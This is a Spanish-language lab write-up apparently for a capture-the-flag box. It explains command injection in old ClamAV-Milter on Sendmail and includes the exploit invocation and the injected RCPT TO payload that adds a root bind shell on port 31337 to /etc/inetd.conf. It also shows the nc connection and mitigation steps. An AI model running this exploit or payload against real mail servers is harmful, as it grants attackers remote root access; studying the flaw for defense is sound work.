# CalmAV-LAB

# 🚩 Sendmail w/ ClamAV-Milter Remote Root Exploit

> **Target:** 192.168.155.42 (Kioptrix Level 1 / ClamAV Box)  
> **Vulnerabilidad:** Command Injection en ClamAV-Milter (Sendmail)  
> **Impacto:** Remote Code Execution (RCE) como `root`

## 📖 Descripción
Este repositorio documenta la explotación de una vulnerabilidad crítica en servidores **Sendmail** antiguos que utilizan **ClamAV-Milter** (versiones < 0.91.2).

El fallo reside en la falta de saneamiento de los inputs durante la transacción SMTP. Específicamente, el milter (filtro de correo) pasa el campo de destinatario (`RCPT TO`) directamente a una llamada de sistema (`popen`) sin limpiarlo, permitiendo a un atacante inyectar comandos de shell.

### Arquitectura del Ataque
El siguiente diagrama ilustra dónde ocurre la intercepción fallida dentro del flujo de correo:



1.  **Cliente (Atacante):** Inicia conexión SMTP.
2.  **Sendmail:** Recibe el comando `RCPT TO`.
3.  **ClamAV-Milter:** Intercepta el comando para escanear/verificar.
4.  **Fallo:** El milter ejecuta el contenido del destinatario como un comando de sistema.

---

## 🛠️ Prerrequisitos

* **Atacante:** Kali Linux (o cualquier distro con Perl y Netcat).
* **Target:** Debe tener el puerto 25 abierto y `clamav-milter` activo.
* **Script:** `4761.pl` (Disponible en Exploit-DB o Searchsploit).

## 🚀 Guía de Explotación

### 1. Reconocimiento
Confirmar que el servicio está corriendo (usualmente Sendmail 8.13.x).

```bash
nmap -p 25 -sV 192.168.155.42
````

### 2\. Ejecución del Exploit

El script en Perl enviará un correo con un payload diseñado para modificar `/etc/inetd.conf`.

```bash
# Sintaxis: perl <script> <IP_Objetivo>
perl 4761.pl 192.168.155.42
```

**Salida esperada:**
Si es exitoso, verás códigos `250` del servidor aceptando las cadenas maliciosas:

> `250 2.1.5 <nobody+"|echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf">... Recipient ok`

### 3\. Acceso (Bind Shell)

El exploit abre una puerta trasera en el puerto **31337**. Conéctate con Netcat:

```bash
nc -nv 192.168.155.42 31337
```

### 4\. Post-Explotación

Una vez dentro, verifica tu identidad y busca la bandera.

```bash
# Verificar usuario (debe ser root)
id
whoami

# Buscar la flag
cd /root
cat proof.txt
```

-----

## 🧠 Análisis Técnico

El código vulnerable en versiones antiguas de `clamav-milter` concatena el argumento del destinatario en una cadena de comando similar a esta:

`sendmail -t <recipient>`

El exploit inyecta caracteres de tubería (`|`) para romper la ejecución original y encadenar nuevos comandos:

`| echo '31337 stream tcp ...' >> /etc/inetd.conf`

Esto agrega un nuevo servicio a `inetd` (el "super-server" de Linux) que escucha en el puerto 31337 y lanza una shell root directa cuando alguien se conecta.

-----

## 🛡️ Mitigación y Solución

Para remediar esta vulnerabilidad en un entorno real:

1.  **Actualizar:** Instalar versiones modernas de ClamAV (\>= 0.91.2) que utilizan `execve` en lugar de `popen` o sanean correctamente los inputs.
2.  **Configuración:** En `sendmail.cf`, restringir los caracteres permitidos en las direcciones de correo.
3.  **Network:** Bloquear el acceso al puerto 25 desde IPs no confiables y monitorear cambios en `/etc/inetd.conf`.

-----

## ⚖️ Disclaimer

Este documento es puramente educativo. El uso de este material contra sistemas sin autorización explícita es ilegal.
